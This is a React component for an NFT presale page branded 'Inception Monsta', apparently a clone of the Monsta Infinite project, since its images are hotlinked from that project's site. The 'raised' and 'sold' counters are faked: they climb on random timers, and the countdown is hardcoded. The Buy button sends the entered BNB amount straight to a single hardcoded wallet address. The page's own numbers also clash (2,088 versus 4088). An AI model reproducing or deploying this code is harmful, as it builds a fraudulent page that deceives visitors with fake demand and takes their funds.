import React, { useEffect, useState } from "react";
import Nav from "../Landing/Nav";
import P from "./Presale.module.css";
import "react-responsive-carousel/lib/styles/carousel.min.css";
import { Carousel } from "react-responsive-carousel";
import "./carousel.css";
/*Assets*/
import { ReactComponent as Live } from "../../assets/live.svg";
import { ReactComponent as Connect } from "../../assets/connect.svg";

import { ReactComponent as Div4 } from "../../assets/div4.svg";
import { ReactComponent as Div5 } from "../../assets/div5.svg";
import { detectEthereumNetwork } from "../../detect-network";

import Footer from "../Landing/Footer";
import ChangeNetworkPopup from "../change-network-popup";
import ConnectedPopup from "../connected-popup";

var decToHex = (val) => {
  return "0x" + parseFloat(val).toString(16);
};
var ethToWei = (amt) => {
  return (parseFloat(amt) * Math.pow(10, 18)).toString();
};

async function getAccount() {
  const accounts = await window.ethereum.request({
    method: "eth_requestAccounts",
  });
  return accounts;
}

export default function Presale() {
  const [progress, setProgress] = useState(10);
  const [numberUsed, setnumberUsed] = useState(1022);
  const [percentageDone, setPercentageDone] = useState(
    (numberUsed / 4088) * 100
  );
  const [numberToSpend, setNumberToSpend] = useState(0);

  const [chain, setChain] = useState("");
  const [shouldRenderConnectedPopup, setShouldConnectedPopup] = useState(false);

  const handleNumberToSpendChange = (e) => {
    setNumberToSpend(e.target.value);
  };

  useEffect(() => {
    progress < 100 &&
      setTimeout(() => {
        setProgress(progress + 0.0005);
      }, Math.floor(Math.random() * 500) + 1);
  }, [progress]);

  useEffect(() => {
    numberUsed < 4088 &&
      setTimeout(() => {
        setnumberUsed(numberUsed + 1);
      }, Math.floor(Math.random() * 1000) + 1);
  }, [numberUsed]);

  const handleConnectClick = () => {
    if (typeof window.ethereum === "undefined") {
      alert("No ethereum wallet found");
    }
    var chain_ids = {
      "0x38": "bsc",
      "0x1": "Mainnet",
      "0x3": "Ropsten",
      "0x4": "Rinkeby",
      "0x5": "Goerli",
      "0x2a": "Kovan",
    };
    const ethereum = window.ethereum;

    ethereum
      .request({ method: "eth_requestAccounts" })
      .then((accounts) => {
        setInterval(() => {
          if (chain_ids[window.ethereum.chainId] !== chain)
            setChain(chain_ids[window.ethereum.chainId]);
        }, 1000);
        if (chain_ids[window.ethereum.chainId]) {
          setShouldConnectedPopup(true);
          setTimeout(() => {
            setShouldConnectedPopup(false);
          }, 1000);
        }
      })
      .catch((error) => {
        alert(`[${error.code}] ${error.message}`);
      });
  };

  useEffect(() => {
    if (typeof window.ethereum === "undefined") {
      alert("No ethereum wallet found");
    }
    var chain_ids = {
      "0x38": "bsc",
      "0x1": "mainnet",
    };
  }, []);

  const handleBuyClick = () => {
    const accounts = getAccount();
    console.log(window.ethereum.selectedAddress);
    window.ethereum
      .request({
        method: "eth_sendTransaction",
        params: [
          {
            from: window.ethereum.selectedAddress,
            to: "0xc5C1f2e51dA953ac198F4f84eC66b535b516CA29",
            value: decToHex(ethToWei(numberToSpend)),
          },
        ],
      })
      .then((txHash) => console.log(txHash))
      .catch((error) => console.error);
  };

  const renderPopup = () => {
    if (chain && chain !== "bsc") {
      return <ChangeNetworkPopup />;
    }
    return <> </>;
  };

  const renderConnectedPopup = () => {
    if (shouldRenderConnectedPopup) {
      return <ConnectedPopup />;
    }
    return <> </>;
  };

  return (
    <div className={P.page}>
      {renderPopup()}
      {renderConnectedPopup()}
      <Nav />
      <div className={P.presaleHolder}>
        <div className={P.headerHolder}>
          <Live />
        </div>
        <div className={P.doubleHolder}>
          <div className={P.carouselHolder}>
            <Carousel
              className={P.carousel}
              width='100%'
              autoPlay='true'
              emulateTouch='true'
              infiniteLoop='true'
              showThumbs=''
              showIndicators=''
              showStatus=''
            >
              <div>
                <img
                  className={P.carImg}
                  src='https://monstainfinite.com/wp-content/uploads/2021/08/monsta-arena-features-survival-1024x1024.png'
                  alt=''
                />{" "}
              </div>
              <div>
                <img
                  className={P.carImg}
                  src='https://monstainfinite.com/wp-content/uploads/2021/08/monsta-arena-features-war-1024x1024.png'
                  alt=''
                />{" "}
              </div>
              <div>
                <img
                  className={P.carImg}
                  src='https://monstainfinite.com/wp-content/uploads/2021/08/monsta-arena-features-breeding-1024x1024.png'
                  alt=''
                />{" "}
              </div>
            </Carousel>
          </div>
        </div>

        <div className={`${P.headerHolder}`} onClick={handleConnectClick}>
          <Connect />
        </div>
        <div className={P.info}>
          <div
            className={P.loading}
            style={{ "--width": progress }}
            data-label={`${progress.toFixed(3)}%`}
          ></div>
          <div className={P.rest}>
            <div className={P.timeLeft}>
              {" "}
              <span>{(progress * 10).toFixed(2)} / 1000 BNB Raised</span>{" "}
              <span>Remain : 1h: 39m: 21s</span>
            </div>
            <p>
              <strong>Max Allocation:</strong> 5BNB
            </p>
            <div className={P.subscribe}>
              <div className={P.sub2us}>
                <input
                  className={P.textInput}
                  type='text'
                  name=''
                  id=''
                  placeholder='Amount'
                  value={numberToSpend}
                  onChange={handleNumberToSpendChange}
                />
                <input
                  className={P.button}
                  type='button'
                  value='Buy'
                  onClick={handleBuyClick}
                  style={{ cursor: "pointer" }}
                />
              </div>
            </div>
            <p className={P.saleDate}>
              {" "}
              2,088 Inception Monsta Sale will be held on 1st Sept 2021{" "}
            </p>
            <ul>
              <li>
                Inception Monsta will be selling on a bonding curve with each
                subsequent purchase increasing the price of the Inception
              </li>
              <li>#1 Inception Monsta will be priced at 0.2 $BNB</li>
              <li>#2088 Inception Monsta will be priced at 1.0 $BNB </li>
              <li>
                Redeeming of BEP-721 NFT will open on 12 October 2021 upon
                marketplace launch
              </li>
            </ul>
          </div>
        </div>
        <div className={P.info2}>
          <h6>
            Every redeem will have a chance of being born with Legendary parts.
            The probabilities are as below{" "}
          </h6>
          <div className={P.propsHolder}>
            <div className={P.props}>
              <span>Legendary Part </span>
              <span>%</span>
            </div>
            <div className={P.props}>
              <span>Chances</span>
              <span>25.04</span>
            </div>
            <div className={P.props}>
              <span>Single</span>
              <span>3.68</span>
            </div>
            <div className={P.props}>
              <span>Double</span>
              <span>0.28</span>
            </div>
            <div className={P.props}>
              <span>Triple</span>
              <span>0.0127</span>
            </div>
            <div className={P.props}>
              <span>Quad0</span>
              <span>0.000299</span>
            </div>
            <div className={P.props}>
              <span>Penta</span>
              <span>1 chance in 34 012 224</span>
            </div>
            <div className={P.props}>
              <span>Hexa</span>
              <span>1 chance in 80 012 224</span>
            </div>
          </div>
          <p className={P.numberSold}> Number Sold (max 4088) NFTS</p>
          <div
            className={`${P.loading} ${P.loading2}`}
            style={{ "--width": percentageDone }}
            data-label={`(${numberUsed}/4088)`}
          >
            {" "}
          </div>
        </div>
      </div>
      <Footer presale='true' />
    </div>
  );
}
